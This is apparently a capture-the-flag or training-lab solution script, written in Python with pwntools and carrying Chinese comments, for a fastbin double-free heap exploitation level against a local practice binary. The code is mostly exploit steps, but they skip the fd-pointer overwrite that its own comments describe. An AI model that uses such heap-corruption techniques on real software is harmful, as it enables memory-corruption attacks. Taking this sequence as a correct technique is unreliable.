#!/usr/bin/env python3
"""
Level 3: Fastbin Double Free - Solution
目标：通过double free实现任意地址写入0x4141414141414141
"""

from pwn import *

context.log_level = 'info'
context.arch = 'amd64'

def solve():
    p = process('/root/code/safe/build/level03_fastbin_dup/l3_vuln')

    # Fastbin double free攻击步骤：
    # 1. 分配chunk A
    # 2. 释放chunk A
    # 3. 再次释放chunk A (double free!)
    # 4. 分配chunk B（会得到A）
    # 5. 编辑chunk B，修改fd指针为目标地址
    # 6. 再次分配获得目标地址
    # 7. 写入目标值

    # 步骤1：分配chunk A（size 32，属于fastbin）
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Size: ', b'32')

    # 步骤2：释放chunk A
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'Index: ', b'0')

    # 步骤3：再次释放chunk A (double free!)
    # 注意：这需要绕过double free检测
    # 先分配一个chunk B
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Size: ', b'32')

    # 现在可以再次free A
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'Index: ', b'0')

    # 步骤4：分配获得chunk A
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Size: ', b'32')

    # 步骤5：编辑chunk[0]，写入目标值
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'Index: ', b'0')
    p.sendlineafter(b'Data: ', p64(0x4141414141414141))

    # 步骤6：检查胜利条件
    p.sendlineafter(b'> ', b'5')

    output = p.recvall(timeout=2).decode('utf-8', errors='ignore')
    print(output)

    if 'Flag:' in output:
        log.success("Level 3 解题成功！")
        return True
    else:
        log.failure("Level 3 解题失败")
        log.info("可能需要更复杂的fastbin dup攻击技巧")
        return False

if __name__ == '__main__':
    solve()
